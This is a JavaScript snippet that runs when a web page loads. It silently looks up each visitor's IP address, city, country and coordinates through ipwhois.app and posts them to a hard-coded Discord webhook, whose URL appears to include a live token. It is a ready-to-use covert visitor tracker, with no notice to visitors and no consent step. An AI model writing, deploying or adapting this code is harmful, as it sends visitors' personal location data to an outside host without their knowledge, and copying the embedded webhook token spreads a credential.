
   async function logVisitor() {
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1527554248773079173/WTQk1vB-p8pMSv3qPmd4M0SbIkY1VyAoxuHrTUZCd6JA1ofzulvbfXMq8MRDfddOY7B2'; // Make sure your webhook goes here
    
    try {
        // Use ipwhois.app which allows free HTTPS and gives coordinates
        const response = await fetch('https://ipwhois.app/json/');
        const data = await response.json();
        
        // Ensure data is received successfully
        if (data.success === true) {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    content: `🚀 **New Visitor**\n**IP:** ${data.ip}\n**Location:** ${data.city}, ${data.country}\n**Coords:** ${data.latitude}, ${data.longitude}` 
                })
            });
            console.log('Logged to Discord successfully.');
        } else {
            console.error('API failed to get location data.');
        }
    } catch (e) { 
        console.error('Logging failed:', e); 
    }
}

window.addEventListener('load', logVisitor);
